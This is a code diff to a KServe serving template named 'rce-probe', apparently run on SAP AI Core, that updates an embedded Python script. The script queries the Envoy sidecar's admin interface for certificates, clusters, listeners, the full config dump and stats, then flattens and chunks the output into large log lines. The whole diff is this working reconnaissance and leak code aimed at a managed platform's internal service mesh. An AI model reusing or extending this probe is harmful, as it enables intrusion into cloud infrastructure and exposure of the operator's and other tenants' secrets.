@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.4.0"
+    ai.sap.com/version: "4.5.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "envoy-admin-certs-clusters-config-dump"
+    executables.ai.sap.com/description: "envoy-compact-clusters-config-dump"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -30,9 +30,9 @@ spec:
             python3 -c "
             import socket
 
-            print('[PROBE_V44_START]', flush=True)
+            print('[PROBE_V45_START]', flush=True)
 
-            def envoy_admin(path, timeout=15):
+            def envoy_admin(path, timeout=20):
                 try:
                     s = socket.socket()
                     s.settimeout(timeout)
@@ -56,38 +56,38 @@ spec:
                 except Exception as e:
                     return f'ERR:{e}'
 
-            # --- 1. Envoy /certs ---
-            resp = envoy_admin('/certs')
-            print('[ENVOY_CERTS]', resp, flush=True)
+            def emit(label, data, chunk=90000):
+                # Collapse newlines so each chunk is ONE log line
+                flat = data.replace('\r\n', '\n').replace('\r', '\n')
+                flat = flat.replace('\n', '|')
+                total = len(flat)
+                for i in range(0, max(1, total), chunk):
+                    seg = flat[i:i+chunk]
+                    print(f'[{label}_{i}/{total}] {seg}', flush=True)
 
-            # --- 2. Envoy /clusters ---
-            resp = envoy_admin('/clusters')
-            # Print in chunks to fit log entries
-            for i in range(0, len(resp), 2000):
-                print(f'[ENVOY_CLUSTERS_{i}]', resp[i:i+2000], flush=True)
+            # 1. /certs
+            emit('CERTS', envoy_admin('/certs'))
 
-            # --- 3. Envoy /listeners ---
-            resp = envoy_admin('/listeners')
-            print('[ENVOY_LISTENERS]', resp[:8000], flush=True)
+            # 2. /clusters
+            emit('CLUSTERS', envoy_admin('/clusters'))
 
-            # --- 4. Envoy /config_dump (large, chunk it) ---
-            resp = envoy_admin('/config_dump', timeout=30)
-            total = len(resp)
-            print(f'[ENVOY_CONFIG_TOTAL_BYTES] {total}', flush=True)
-            chunk_size = 3000
-            for i in range(0, min(total, 120000), chunk_size):
-                print(f'[CFG_{i}]', resp[i:i+chunk_size], flush=True)
+            # 3. /listeners
+            emit('LISTENERS', envoy_admin('/listeners'))
 
-            # --- 5. Envoy /stats (key stats for internal service comms) ---
+            # 4. /config_dump (full, chunked at 90KB)
+            emit('CFGDUMP', envoy_admin('/config_dump', timeout=30))
+
+            # 5. /stats filtered
             resp = envoy_admin('/stats')
-            # Filter for cluster-level upstream stats only
             lines = [l for l in resp.split('\n')
                      if any(k in l for k in ['upstream_cx', 'upstream_rq',
                                               'ssl.handshake', 'ssl.fail',
-                                              'ssl.connection_error'])]
-            print('[ENVOY_STATS_FILTERED]', '\n'.join(lines[:200]), flush=True)
+                                              'ssl.connection_error',
+                                              'cluster_manager',
+                                              'server.'])]
+            emit('STATS', '\n'.join(lines[:300]))
 
-            print('[PROBE_V44_DONE]', flush=True)
+            print('[PROBE_V45_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
